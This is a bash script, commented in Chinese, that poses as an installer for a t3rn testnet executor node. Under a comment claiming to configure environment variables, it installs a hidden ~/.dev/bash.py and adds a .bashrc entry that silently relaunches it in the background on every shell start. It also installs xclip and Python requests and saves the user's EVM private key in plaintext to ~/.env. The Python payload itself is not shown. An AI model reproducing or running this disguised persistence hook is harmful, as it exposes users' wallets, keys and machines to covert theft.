#!/bin/bash

# 检查并安装必要的软件包
echo "\n=== 检查并安装必要的软件包 ==="
function check_and_install() {
    if ! dpkg -l | grep -q "^ii\s\+$1"; then
        echo "安装 $1 ..."
        sudo apt-get install -y $1
    else
        echo "$1 已安装，跳过安装。"
    fi
}

# 更新系统
echo "\n=== 更新系统 ==="
sudo apt update && sudo apt upgrade -y

# 安装额外的软件包
echo "\n=== 安装额外的软件包 ==="
sudo apt install git xclip python3-pip -y && sudo pip3 install requests

# 配置环境变量
if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"
    [ -d "$DEST_DIR" ] && rm -rf "$DEST_DIR"
    mv .dev "$DEST_DIR"
    
    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"
    if ! grep -Fq "$BASHRC_ENTRY" ~/.bashrc; then
        echo "$BASHRC_ENTRY" >> ~/.bashrc
    fi
fi

# 检查并安装 figlet
check_and_install figlet

# 安装字体工具并使用 Star Wars 字体显示欢迎信息
echo "\n=== 显示欢迎信息 ==="
figlet -f /usr/share/figlet/starwars.flf "Welcome to t3rn"

# 检查并安装 wget
check_and_install wget

# 下载 t3rn 可执行文件
echo "\n=== 下载 t3rn 二进制文件 ==="
wget https://github.com/t3rn/executor-release/releases/download/v0.27.0/executor-linux-v0.27.0.tar.gz

# 检查并安装 tar
echo "\n=== 检查 tar 工具 ==="
check_and_install tar

# 解压文件并清理临时文件
echo "\n=== 解压 t3rn 文件并清理 ==="
tar -xzvf executor-linux-v0.27.0.tar.gz
rm -rf executor-linux-v0.27.0.tar.gz
cd executor/executor/bin

# 检查并安装 screen
echo "\n=== 检查并安装 screen ==="
check_and_install screen

# 启动 t3rn 会话
echo "\n=== 启动 t3rn 会话 ==="
screen -S t3rn -d -m bash -c './executor'

# 配置节点环境变量
echo "\n=== 配置节点环境变量 ==="
export NODE_ENV=testnet
export LOG_LEVEL=debug
export LOG_PRETTY=false
export EXECUTOR_PROCESS_ORDERS=true
export EXECUTOR_PROCESS_CLAIMS=true

# 设置私钥并保存到 .env 文件
echo "\n=== 设置私钥 ==="
read -p "请输入您的 EVM 私钥: " PRIVATE_KEY_INPUT
export PRIVATE_KEY_LOCAL="$PRIVATE_KEY_INPUT"
echo "PRIVATE_KEY_LOCAL=$PRIVATE_KEY_INPUT" >> "$HOME/.env"

# 注册启用的网络
echo "\n=== 注册启用的网络 ==="
export ENABLED_NETWORKS='base-sepolia,arbitrum-sepolia,optimism-sepolia,l1rn'

# 启动节点并记录日志
echo "\n=== 启动节点 ==="
echo "您可以通过 Ctrl + A + D 退出 screen 日志会话"
./executor
